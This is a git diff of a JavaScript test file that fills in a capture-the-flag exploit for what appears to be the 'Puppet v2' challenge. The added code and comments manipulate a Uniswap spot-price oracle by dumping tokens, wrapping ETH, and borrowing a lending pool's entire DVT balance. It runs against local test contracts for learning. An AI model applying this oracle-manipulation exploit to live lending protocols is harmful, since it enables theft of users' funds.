@@ -2,7 +2,7 @@ const pairJson = require("@uniswap/v2-core/build/UniswapV2Pair.json");
 const factoryJson = require("@uniswap/v2-core/build/UniswapV2Factory.json");
 const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json");
 
-const { ethers } = require('hardhat');
+const { web3, ethers } = require('hardhat');
 const { expect } = require('chai');
 
 describe('[Challenge] Puppet v2', function () {
@@ -81,7 +81,73 @@ describe('[Challenge] Puppet v2', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        // /** CODE YOUR EXPLOIT HERE */
+
+        /**
+         * HOW TO ATTACK:
+         * We can manipulate price at uniswap, that is an oracle for PuppetV2Pool, so we can borrow enough DVT tokens.
+         * 
+         * PLAN OF ATTACK:
+         * 1. Swap all DVT token for ETH at uniswap (router)
+         * 2. Wrap all ethers by depositing ETH to WETH
+         * 3. Borrow all DVT from lending pool using WETH
+         */
+
+        // Function to log
+        async function logState(message, pool, weth, token) {
+            const denominator = 10**18;
+            console.log(message);
+            console.log('ETH:');
+            console.log('attacker');
+            console.log(Number(
+                await ethers.provider.getBalance(attacker.address)
+            )/denominator);
+            console.log('pool');
+            console.log(Number(
+                await ethers.provider.getBalance(pool.address)
+            )/denominator);
+            console.log('WETH:');
+            console.log('attacker');
+            console.log(Number(
+                await weth.balanceOf(attacker.address)
+            )/denominator);
+            console.log('pool');
+            console.log(Number(
+                await weth.balanceOf(weth.address)
+            )/denominator);
+            console.log('Tokens (DVT):');
+            console.log('attacker');
+            console.log(Number(
+                await token.balanceOf(attacker.address)
+            )/denominator);
+            console.log('pool');
+            console.log(Number(
+                await token.balanceOf(pool.address)
+            )/denominator);
+        }
+
+        // Log initial state
+        logState("=== INITIAL STATE ===", pool=this.lendingPool, weth=this.weth, token=this.token);
+
+        // Use Uniswap Router to swap DVT for ETH
+        await this.token.connect(attacker).approve(this.uniswapRouter.address, await this.token.balanceOf(attacker.address));
+        await this.uniswapRouter.connect(attacker).swapExactTokensForETH(
+            await this.token.balanceOf(attacker.address),
+            1000,
+            [this.token.address, this.weth.address],
+            attacker.address,
+            (await ethers.provider.getBlock('latest')).timestamp + 1000
+        );
+
+        // Deposit ETH to wrapped ETH, so we can then borrow it from lending pool
+        await this.weth.connect(attacker).approve(this.lendingPool.address, await ethers.provider.getBalance(attacker.address));
+        await this.weth.connect(attacker).deposit({value: (await ethers.provider.getBalance(attacker.address)).sub(ethers.utils.parseEther('0.1'))});
+
+        // Borrow DVT for wrapped ETH from lending pool
+        await this.lendingPool.connect(attacker).borrow(await this.token.balanceOf(this.lendingPool.address));
+
+        // Log end state
+        logState("=== END STATE ===", pool=this.lendingPool, weth=this.weth, token=this.token);
     });
 
     after(async function () {
